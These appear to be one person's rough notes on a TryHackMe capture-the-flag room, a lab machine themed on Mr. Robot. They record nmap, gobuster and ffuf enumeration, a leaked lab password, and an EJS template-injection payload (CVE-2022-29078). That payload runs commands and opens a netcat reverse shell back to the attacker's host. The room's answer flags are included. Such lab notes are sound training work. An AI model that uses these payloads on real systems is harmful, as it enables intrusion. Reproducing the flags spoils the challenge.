#CTF #Easy 

https://tryhackme.com/room/whiterose

This challenge is based on the Mr. Robot episode "409 Conflict". Contains spoilers!

```
Olivia Cortez:olivi8

10.10.211.101

# nmap

22/tcp open  ssh
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)

80/tcp open  http
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:6D:51:AA:74:D1 (Unknown)

# gobuster
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t64 --no-error | lolcat

nothing

nano /etc/hosts
10.10.211.101 http://cyprusbank.thm/

source code
https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css

bootstrap 5.3.0 = no vulns

# ffuf 
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.cyprusbank.thm/" -u http://$ip -fs 57

www
admin

/etc/hosts
admin.cyprusbank.thm

login page
Olivia Cortez :olivi8

/settings = permission denied

http://admin.cyprusbank.thm/messages/?c=5
Mrs.Jacobs
Gregor Ivayla
Jemmy Laurel

messages/?c=8
admin
Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'

login as Gayle

Tyrell Wellick 	$20.855.900.000 	842-029-5701

http://admin.cyprusbank.thm/settings

# burpsuite 

name=test

response error
/home/web/web/app/views/settings.ejs:14 

CVE-2022-29078
https://security.snyk.io/vuln/SNYK-JS-EJS-2803307

&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami')

nc -nlvp 4444

nc -e sh 10.10.32.236 1337

&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('busybox nc 10.10.32.236 4444 -e /bin/bash');

```

```
What's Tyrell Wellick's phone number?

842-029-5701

Take things a step further and compromise the machine.
What is the user.txt flag?

THM{4lways_upd4te_uR_d3p3nd3nc!3s}

What is the root.txt flag?

THM{4nd_uR_p4ck4g3s}
```

command worked for rev shell + flags  (redo room)
https://medium.com/@alexmiminas/thm-whiterose-write-up-fbe6a2bf70af

not very helpful
https://medium.com/@athu.patil03/tryhackme-whiterose-writeup-604a58289c6e

https://www.youtube.com/watch?v=-FV8IXKGt-A

